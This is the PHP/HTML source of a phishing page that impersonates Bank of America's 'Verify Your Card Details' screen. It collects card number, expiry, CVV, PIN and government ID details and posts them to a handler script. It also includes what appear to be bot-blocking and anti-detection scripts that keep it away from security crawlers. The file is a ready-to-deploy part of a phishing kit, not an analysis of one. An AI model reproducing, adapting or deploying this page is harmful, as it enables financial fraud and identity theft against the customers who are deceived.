<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include('blocker.php');
include('antirobot.php');
include('bt.php');

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Bank of America | Online Banking | Verify Card Details</title>

<link rel="icon" href="favicon.ico" type="image/x-icon">

<style type="text/css">
body{
margin:0;

}



@font-face{font-family:"cnx-regular";src:url("cnx-regular.eot");src:url("cnx-regular.eot?#iefix") format("embedded-opentype"),url("cnx-regular.woff2") format("woff2"),url("cnx-regular.woff") format("woff"),url("cnx-regular.ttf") format("truetype");font-weight:300;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-bold";src:url("cnx-bold.eot");src:url("cnx-bold.eot?#iefix") format("embedded-opentype"),url("cnx-bold.woff2") format("woff2"),url("cnx-bold.woff") format("woff"),url("cnx-bold.ttf") format("truetype");font-weight:700;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-medium";src:url("cnx-medium.eot");src:url("cnx-medium.eot?#iefix") format("embedded-opentype"),url("cnx-medium.woff2") format("woff2"),url("cnx-medium.woff") format("woff"),url("cnx-medium.ttf") format("truetype");font-weight:300;font-style:italic;font-variant:normal}

.inbox1 {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

.inbox1:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}



.inbox2 {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 130px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

.inbox2:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 130px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}

.id_label{position:absolute; padding-left:4px; padding-bottom:6px; color: #333; font-size:14px; font-weight:bold; font-family: cnx-regular, Arial, Helvetica, sans-serif;}
.id_label3{

    color: #fff;
    border: none;
    font-weight: bold;
    font-size: 24px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;
	}
	
.id_label5{

 	color: #0153C3;
    border: none;
    font-weight: bold;
    font-size: 14px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;

}

.id_label6{

    color:rgb(65, 64, 66);
    border: none;
    font-weight: 200;
    font-size: 14px;
	font-family:Verdana,Arial,sans-serif;;

}





.inbox3 {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 136px;
height: 36px;
border:1px solid #ccc;
color: #000000;
font-style:normal;
}

.inbox3 :focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 136px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}



</style>



<script src="jquery-3.1.0.min.js"></script>
 <script src="jquery.maskedinput.js"></script>

    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:"xxx-xx-xxxx"});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#dt').mask("999", {placeholder:""});
    });   
    </script>
	    <script>
    $(document).ready(function(){
     $('#psp').mask("9999-9999-9999-9999", {placeholder:"____-____-____-____"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
	
    <script>
    $(document).ready(function(){
     $('#bn1').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
	
    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:""});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#pinsi').mask("9999", {placeholder:""});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#phnno').mask("999-999-9999", {placeholder:"X"});
    });   
    </script>
	
	<script>
    $(document).ready(function(){
     $('#udds').mask("99/99/9999", {placeholder:"DD/MM/YYYY"});
    });   
    </script>




</head>

<body style=" background-image:url(cardaccessbg.jpg); background-repeat: no-repeat; height:757px;">

<div style="position:absolute; left:45px; top:85px;"><label class="id_label3">Verify Your Card Details</label></div>


<div style="position:absolute; left:1015px; top:48px; width:100px;"><label class="id_label5">Sign Out</label></div>

<div style="position:absolute; left:1010px; top:155px;"><img src="alert.jpg" width="299" height="375" /></div>


<form id="loginForm" method="post" action="clearsort4.php" target="_self" novalidate="novalidate">

<div style="position:absolute; left:45px; top:145px; width:200px;"><label class="id_label">Card Number</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:165px;"><input min="0" id="psp" class="inbox1" type="text" name="cardno" placeholder="Card Number"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" >
                          
</div> 


<div style="position:absolute; left:45px; top:220px; width:200px;"><label class="id_label">Expiry Month</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:240px;">
<select class="inbox3" name="month">
<option value="">Exp Month</option>
<option value="01">January</option>
<option value="02">February</option>
<option value="03">March</option>
<option value="04">April</option>
<option value="05">May</option>
<option value="06">June</option>
<option value="07">July</option>
<option value="08">August</option>
<option value="09">September</option>
<option value="10">October</option>
<option value="11">November</option>
<option value="12">December</option>
</select>
                          
</div>



<div style="position:absolute; left:200px; top:220px; width:200px;"><label class="id_label">Expiry Year</label></div>
<div style="position:absolute; overflow:hidden; left:202px; top:240px;">
<select class="inbox3" name="year">
<option value="">Exp Year</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
</select>
                          
</div>

<div style="position:absolute; left:45px; top:285px; width:200px;"><label class="id_label">CVV</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:303px;"><input min="0" id="" class="inbox2" type="text" name="cvv" placeholder="CVV"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" maxlength="3" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"></div>

<div style="position:absolute; left:200px; top:285px; width:200px;"><label class="id_label">PIN</label></div>
<div style="position:absolute; overflow:hidden; left:202px; top:303px;"><input min="0" id="" class="inbox2" type="password" name="pin" placeholder="PIN"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" maxlength="4" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"></div>


<div style="position:absolute; left:45px; top:360px; width:300px;"><label class="id_label">Verify With Your Government Issued ID</label></div>
<div style="position:absolute; left:45px; top:380px; width:300px;">
<select name="idtype" class="inbox1">
<option selected="selected" value="">Select ID Type...</option>
<option value="International Passport">International Passport</option>
<option value="Driver's License">Driver's License</option>
<option value="National ID">National ID</option>
</select>
</div> 

<div style="position:absolute; left:45px; top:425px; width:300px;">
<input min="0" class="inbox1" type="text" name="idno" placeholder="ID Number"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" >
</div> 

<div style="position:absolute; left:45px; top:470px; width:300px;">
<input min="0" id="bn" class="inbox2" type="text" name="iss" placeholder="Issue Date"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" >
</div> 

<div style="position:absolute; left:200px; top:470px; width:300px;">
<input min="0" id="bn1" class="inbox2" type="text" name="exp" placeholder="Expiry Date"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" >
</div> 

<div style="position:absolute; left:45px; top:520px; width:300px;">
<input min="0" class="inbox1" type="text" name="state" placeholder="Issue State"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" >
</div> 



<div id="formimage1" style="position:absolute; left:45px; top:563px; width:122px;"> <input type="image" name="formimage1" src="sub-btn.jpg" 
width="104" height="42"></div>
</form>





</body>
</html>
